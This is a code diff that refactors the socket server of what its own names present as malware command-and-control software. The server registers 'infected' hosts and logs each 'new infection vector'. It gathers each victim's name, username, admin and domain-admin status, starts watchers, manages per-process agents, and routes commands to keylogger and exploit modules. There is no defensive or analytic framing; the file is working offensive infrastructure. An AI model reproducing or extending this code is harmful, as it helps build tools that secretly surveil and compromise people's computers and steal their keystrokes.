@@ -1,6 +1,7 @@
 import asyncio
 import ssl
 from classes.user import User
+from classes.agent import Agent
 from dataManager.dataManager import DataManager
 from dataManager.repository.userRepository import UserRepository
 import logging
@@ -18,67 +19,60 @@ class SocketServer:
         self.certfile = certfile
         self.keyfile = keyfile
         self.lock = app_state.lock
-        self.keylogger = KeyloggerModule(self.user_repository)
-        self.recognizer = Recognizer(self.user_repository)
-        self.exploit_module = ExploitModule(self.user_repository)
+        self.recognizer = self.data_manager.recognizer_module
+        self.keylogger = self.data_manager.keylogger_module
+        self.exploit_module = self.data_manager.exploit_module
+        self.agent_module = self.data_manager.agent_module
+
 
     async def handle_client(self, reader: asyncio.StreamReader, writer : asyncio.StreamWriter):
-
+        
         ip, port = writer.get_extra_info('peername')
 
-        while True:
-            data = await reader.read(4096)
-            logging.info("Received data from " + ip + " : " + data.decode())
-            service, uuid, params = data.decode().split("|||") 
-            message = await self.route(service, uuid, params, reader, writer, ip, port)
-            if service == "infected":
-                await self.handle_known_client(self.user_repository.get_user(uuid))
-                break
-            if message == "[close]":
-                writer.close()
-                await writer.wait_closed()
-                break
-    
-    async def handle_known_client(self, user: User):
-        reader = user.reader
-        writer = user.writer
-        ip = user.ip
-        port = user.port
-        uuid = user.uuid
-        while True:
-            async with user.lock:
-                logging.info(f"Waiting for data from {ip}")
-                data = await reader.read(4096)
-                if not data:
-                    return "[close]"
-            logging.info("Received data from " + ip + " : " + data.decode())
-            try:
-                service, uuid, params = data.decode().split("|||")
-            except ValueError:
-                logging.error(f"Invalid data received : {data}")
-                continue
-            if service == "pause":
-                await asyncio.sleep(0.1)
-                continue
-            message = await self.route(service, uuid, params, reader, writer, ip, port)
-            if message == "[close]":
-                writer.close()
-                await writer.wait_closed()
-                break
+        data = await reader.read(4096)
+        if not data:
+            logging.info(f"Connection closed by {ip}")
+            return
+        
+        logging.info("Received data from " + ip + " : " + data.decode())
+        service, uuid, params = data.decode().split("|||") 
+        
+        message = await self.route(service, uuid, params, reader, writer, ip, port)
 
-            
+        if message == "[close]":
+            writer.close()
+            await writer.wait_closed()
 
     async def route(self, service, uuid, params, reader, writer, ip, port):
         if service == "infected":
+            logging.info(f"New infection vector: {uuid}")
             if uuid in [x["logged"] for x in self.user_repository.get_user_list()]:
                 writer.write("exit".encode())
                 return "[close]"
-            user = User(uuid, ip, port, reader, writer)
-            is_admin = await self.recognizer.check_is_admin(reader, writer)
-            user.is_admin = is_admin
-            user.first_name, user.last_name, user.username = (await self.recognizer.get_username(reader, writer)).values()
-            self.user_repository.add_user(user)
-            #await self.keylogger.inject(uuid)
+            user = self.user_repository.get_user(uuid)
+            if not user:
+                user = User(uuid, ip, port, reader, writer, agent_module=self.agent_module)
+                self.user_repository.add_user(user)
+            else:
+                user.ip = ip
+                user.port = port
+                user.reader = reader
+                user.writer = writer
+                user.agent_module = self.agent_module
+            user.first_name, user.last_name, user.username, is_admin, is_domain_admin = (await self.recognizer.get_user_infos(reader, writer)).values()
+            user.start_not_running_watchers()
+            
+        elif service == "agent":
+            user = self.user_repository.get_user(uuid)
+            pid = params
+            if not user.is_logged_in():
+                user.reader = reader
+                user.writer = writer
+            agent = Agent(reader, writer, user, pid)
+            logging.info(f"Agent {uuid} with pid {pid} connected: {user.first_name} {user.last_name} ({user.username})")
+
+            await agent.handle()
+            return "[close]"
         elif service == "keylogger":
             await self.keylogger.action(params, uuid)
             return "[close]"
